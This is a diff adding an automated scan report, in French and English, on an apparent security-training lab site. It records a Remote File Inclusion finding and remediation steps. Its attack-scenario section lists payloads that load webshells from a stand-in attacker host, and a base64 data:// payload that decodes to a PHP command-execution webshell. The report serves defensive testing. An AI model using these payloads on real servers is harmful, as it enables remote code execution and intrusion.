@@ -1,0 +1,76 @@
+Generated: 2025-11-04 10:23:08
+
+Target
+https://0a4f001504739ed681a1a7b60062001e.web-security-academy.net/
+
+Scan Duration
+0:05:13.881652
+
+URLs Scanned
+30
+
+10
+Critical
+
+9
+High
+
+90
+Medium
+
+30
+Low
+
+Executive Summary
+Cette évaluation de sécurité a identifié 139 problèmes de sécurité potentiels sur le système cible. Les vulnérabilités critiques nécessitent une attention immédiate car elles présentent un risque important pour l'organisation. Les problèmes de gravité élevée et moyenne doivent être traités par ordre de priorité. Distribution des Risques: - Critique: 10 problèmes - Élevé: 9 problèmes - Moyen: 90 problèmes - Faible: 30 problèmes
+
+Vulnerabilities
+Remote File Inclusion (RFI)
+🕐 Discovered: 2025-11-04 10:23:08
+
+Severity: CRITICAL
+URL: https://0a4f001504739ed681a1a7b60062001e.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories
+Parameter: category
+Description: RFI allows including remote files, potentially leading to RCE
+
+Payload Used:
+
+http://example.com/test.txt
+Evidence: Remote file content appears in response
+
+🛡️ How to Fix This Vulnerability
+Priority: CRITICAL ⏱️ Estimated Fix Time: 1 day
+⚠️ Scénario d'Attaque & Exemple d'Exploitation:
+
+
+ATTACK SCENARIO - Remote File Inclusion:
+1. Find include/require with user input: include($_GET['page'])
+2. Host malicious file: http://attacker.com/shell.txt
+3. Inject URL: /page.php?page=http://attacker.com/shell.txt
+4. Server includes and executes remote code
+
+ATTACK PAYLOADS:
+?page=http://attacker.com/webshell.txt
+?page=http://attacker.com/malware.txt?
+?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+✅ Solution:
+
+
+SOLUTION:
+1. Disable remote file inclusion: allow_url_include = Off
+2. Disable remote file operations: allow_url_fopen = Off
+3. Use whitelist for all file inclusions
+4. Never use user input directly in include/require
+5. Set open_basedir restriction
+6. Use Content-Security-Policy header
+
+ERROR CODE: CWE-98 (PHP File Inclusion)
+Étapes de Correction:
+
+Disable allow_url_include and allow_url_fopen in PHP
+Never include files from user-controlled URLs
+Validate and whitelist all included resources
+Use Content Security Policy headers
+Implement strict input validation
+Monitor for suspicious file inclusion attempts
+Exemple de Code (Vulnérable vs Sécurisé):
